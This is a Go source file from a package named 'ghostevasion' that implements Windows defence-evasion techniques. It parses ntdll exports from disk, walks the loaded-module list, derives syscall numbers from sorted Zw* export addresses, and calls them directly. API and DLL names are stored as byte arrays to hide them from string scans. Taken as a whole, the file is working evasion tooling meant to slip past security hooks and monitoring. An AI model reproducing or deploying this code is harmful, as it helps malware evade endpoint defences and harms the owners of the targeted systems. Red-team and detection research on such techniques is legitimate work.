package ghostevasion

import (
	"encoding/binary"
	"strings"
	"syscall"
	"unsafe"

	"github.com/Binject/debug/pe"
	"golang.org/x/sys/windows"
)

type dll struct {
	ntApi   bool
	Api     string
	exports []pe.Export
	DllBase uintptr
	Addres  uintptr
}

func getModuleHandle(i int) (start uintptr, size uintptr, modulepath string) {
	var UnicodeString *nTUnicodeString
	start, size, UnicodeString = getModule(i)
	modulepath = UnicodeString.String()
	return
}

var Nt = dll{Addres: 0}

func GetSysidDisk(api string) (Sys, error) {
	if Nt.Addres == 0 {
		Nt = NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'}))
	}
	Dll := Nt.NewProc(api)
	SysNumber := Dll.Addres + 4

	//NtReadVirtualMemory
	NtRead := Nt.NewProc(string([]byte{'N', 't', 'R', 'e', 'a', 'd', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'}))
	buffer := make([]byte, 4)
	var bytesread uintptr
	_, err := NtRead.Call(
		//Proceso actual
		0xffffffffffffffff,
		SysNumber,
		uintptr(unsafe.Pointer(&buffer[0])),
		4,
		uintptr(unsafe.Pointer(&bytesread)),
	)
	if err != nil {
		return Sys{}, errCall{ErrMessage: "Error Read SyscallId"}
	}

	sysID := binary.LittleEndian.Uint32(buffer)
	return Sys{Id: uint16(sysID)}, nil

}

type Count_LIST struct {
	hashName string
	Address  uintptr
}

type DW_SYSCALL_LIST struct {
	Slist map[string]*SYSCALL_LIST
}

type SYSCALL_LIST struct {
	Count   uint16
	Address uintptr
}

func (s Sys) Syscall(args ...uintptr) (err error) {
	errcode := hgSyscall(s.Id, args...)
	if errcode != 0 {
		return errCall{ErrMessage: "Error call"}
	}
	return nil
}

func (dl *DW_SYSCALL_LIST) GetSysid(s string) (Sys, error) {
	captial, ok := dl.Slist[s]
	if ok {
		return Sys{Id: captial.Count}, nil
	} else {
		return Sys{}, errCall{ErrMessage: "Not found SysId"}
	}
}

type Sys struct {
	Id uint16
}

func Whisper(hash func(string) string) *DW_SYSCALL_LIST {
	var newSL DW_SYSCALL_LIST
	newSL.Slist = make(map[string]*SYSCALL_LIST)

	hasher := func(a string) string {
		return a
	}
	if hash != nil {
		hasher = hash
	}

	Ntd := NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'}))
	ex := Ntd.exports

	var cl []Count_LIST
	for _, exStub := range ex {
		if !strings.HasPrefix(exStub.Name, "Zw") {
			continue
		}
		nameHash := strings.ToLower(hasher("Nt" + exStub.Name[2:]))
		tmpList := SYSCALL_LIST{
			Count:   0,
			Address: uintptr(exStub.VirtualAddress),
		}
		tmpCList := Count_LIST{
			hashName: nameHash,
			Address:  uintptr(exStub.VirtualAddress),
		}
		newSL.Slist[nameHash] = &tmpList
		cl = append(cl, tmpCList)
	}

	for i := 0; i < len(cl)-1; i++ {
		for j := 0; j < len(cl)-i-1; j++ {
			if cl[j].Address > cl[j+1].Address {
				tmp := Count_LIST{
					hashName: cl[j].hashName,
					Address:  cl[j].Address,
				}
				cl[j].Address = cl[j+1].Address
				cl[j].hashName = cl[j+1].hashName
				cl[j+1].Address = tmp.Address
				cl[j+1].hashName = tmp.hashName
			}
		}
	}

	for i := 0; i < len(cl); i++ {
		newSL.Slist[cl[i].hashName].Count = uint16(i)
	}

	return &newSL
}

func loadDll(modulename string) (uintptr, uintptr) {
	s, si, p := getModuleHandle(0)
	start := p
	if strings.Contains(strings.ToLower(p), strings.ToLower(modulename)) {
		return s, si
	}
	p = ""
	for i := 1; p != start; i++ {
		s, si, p = getModuleHandle(i)
		if p != "" {
			if strings.Contains(strings.ToLower(p), strings.ToLower(modulename)) {
				return s, si
			}
		}
	}
	n, err := windows.NewNTUnicodeString(modulename)
	if err != nil {
		panic(err)
	}
	Ldr := NewLazyDLL(string([]byte{'n', 't', 'd', 'l', 'l'})).NewProc(string([]byte{'L', 'd', 'r', 'L', 'o', 'a', 'd', 'D', 'l', 'l'}))
	var Handle uintptr
	Ldr.Call(
		0,
		0,
		uintptr(unsafe.Pointer(n)),
		uintptr(unsafe.Pointer(&Handle)),
	)
	if Handle == 0 {
		panic("Not found dll: " + modulename)
	}
	return Handle, 0

}

type error interface {
	Error() string
}

type errCall struct {
	ErrMessage string
}

func (z errCall) Error() string {
	return z.ErrMessage
}

func (D dll) Call(argumentos ...uintptr) (uintptr, error) {
	if D.ntApi {
		r, _, _ := syscall.SyscallN(D.Addres,
			argumentos...,
		)
		if r != 0 {
			return 0, errCall{ErrMessage: "Error call " + D.Api}
		}
	} else {
		r, _, err := syscall.SyscallN(D.Addres,
			argumentos...,
		)
		if err != syscall.Errno(0) {
			return 0, err
		}
		return r, nil
	}
	return 0, nil
}

func (D dll) NewProc(name string) dll {
	for _, i := range D.exports {
		if name == i.Name {
			D.Api = i.Name
			D.Addres = uintptr(i.VirtualAddress) + D.DllBase
			return D
		}
	}
	panic("Not found api: " + name)
}

func NewLazyDLL(DllName string) (N dll) {
	DllName = strings.ToLower(DllName)
	if DllName[len(DllName)-4:] != ".dll" {
		DllName += ".dll"
	}
	if strings.Contains(DllName, string([]byte{'n', 't', 'd', 'l', 'l'})) {
		N.ntApi = true
	}

	Name := string([]byte{'c', ':', '\\', 'w', 'i', 'n', 'd', 'o', 'w', 's', '\\', 's', 'y', 's', 't', 'e', 'm', '3', '2', '\\'}) + DllName
	p, err := pe.Open(Name)
	if err != nil {
		panic(err)
	}

	exp, err := p.Exports()
	if err != nil {
		panic(err)
	}

	Base, _ := loadDll(DllName)
	N.exports = exp
	N.DllBase = Base
	return
}
